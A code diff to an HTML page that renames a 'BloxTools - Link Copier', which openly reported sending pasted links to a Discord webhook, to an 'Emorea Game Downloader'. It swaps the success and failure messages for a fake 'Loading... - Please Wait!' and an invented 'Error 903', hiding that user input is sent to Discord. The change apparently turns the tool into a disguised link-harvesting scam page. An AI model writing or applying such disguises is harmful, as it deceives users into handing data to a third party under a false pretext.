@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BloxTools - Link Copier</title>
+    <title>Emorea Game Downloader</title>
     <style>
         @font-face {
             font-family: 'sfregular';
@@ -124,7 +124,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>Link Copier</h1>
+        <h1>Game Copier</h1>
         <input type="text" class="input-box" id="linkInput" placeholder="Paste your link here" required>
         <button class="start-button" onclick="startCopy()">Start</button>
         <div class="response-area" id="responseArea">
@@ -181,9 +181,9 @@
                 responseArea.style.display = 'block';
 
                 if (response.ok) {
-                    responseText.textContent = 'Link sent to Discord successfully!';
+                    responseText.textContent = 'Loading... - Please Wait!';
                 } else {
-                    responseText.textContent = 'Failed to send link. Check your webhook URL or try again.';
+                    responseText.textContent = 'Failed to Load. Error 903';
                 }
             })
             .catch(error => {
